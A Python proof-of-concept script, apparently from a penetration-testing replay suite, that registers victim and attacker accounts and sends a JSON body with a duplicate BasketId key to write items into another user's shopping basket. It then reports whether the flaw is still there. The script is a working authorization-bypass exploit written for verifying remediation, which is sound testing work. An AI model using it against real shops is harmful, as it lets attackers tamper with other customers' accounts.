#!/usr/bin/env python3
"""pt14: HTTP Parameter Pollution lets an attacker write to a victim's basket.

addBasketItem parses the raw request body with a streaming parser that
preserves duplicate JSON keys. Its ownership check reads the FIRST
occurrence of a repeated "BasketId" key; the item it actually inserts
uses the LAST. A body with "BasketId" listed twice, the caller's own
id first, a victim's id second, passes the check and writes to the
victim's basket.

The raw body with a duplicate key can't be built from a Python dict
(keys are unique), so it's constructed as a literal string here,
matching what the vendor's own parser actually receives.

Standard library only (urllib, base64, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt14-001.json"


def _jwt_payload(token: str) -> dict:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def _request(method: str, url: str, token: str | None = None, raw_body: str | None = None):
    data = raw_body.encode() if raw_body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if raw_body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> tuple[str, int]:
    email = f"pt14-{label}-{stamp}@flatline.test"
    password = "Pt14Pass123!"
    _request("POST", f"{target}/api/Users", raw_body=json.dumps({"email": email, "password": password, "passwordRepeat": password}))
    status, body = _request("POST", f"{target}/rest/user/login", raw_body=json.dumps({"email": email, "password": password}))
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"], body["authentication"]["bid"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_token, victim_bid = _register_and_login(target, "victim", stamp)
    attacker_token, attacker_bid = _register_and_login(target, "attacker", stamp)

    # appendUserId (the mounted middleware ahead of addBasketItem) requires
    # the authenticatedUsers cache to already have this token, same quirk
    # pt01/pt09/pt11 document.
    _request("GET", f"{target}/rest/user/whoami", token=attacker_token)

    polluted_body = f'{{"BasketId": {attacker_bid}, "ProductId": 1, "quantity": 1, "BasketId": {victim_bid}}}'
    exploit_status, exploit_body = _request("POST", f"{target}/api/BasketItems", token=attacker_token, raw_body=polluted_body)
    inserted_basket_id = exploit_body.get("data", {}).get("BasketId")

    if exploit_status in (400, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and inserted_basket_id == victim_bid:
        status = "VULNERABLE"
        summary = f"Attacker (basket {attacker_bid}) wrote an item into the victim's basket ({victim_bid}) via a duplicate BasketId key."
    elif exploit_status == 200 and inserted_basket_id == attacker_bid:
        status = "REMEDIATED"
        summary = "Request succeeded, but the duplicate key was resolved consistently: the item landed in the attacker's own basket, not the victim's."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, inserted_basket_id={inserted_basket_id!r}."

    legit_body_raw = f'{{"BasketId": {attacker_bid}, "ProductId": 1, "quantity": 1}}'
    legit_status, legit_resp = _request("POST", f"{target}/api/BasketItems", token=attacker_token, raw_body=legit_body_raw)
    legitimate_own_basket_ok = legit_status == 200 and legit_resp.get("data", {}).get("BasketId") == attacker_bid

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_own_basket_ok": legitimate_own_basket_ok,
        "legitimate_own_basket_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt14-basket-parameter-pollution", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
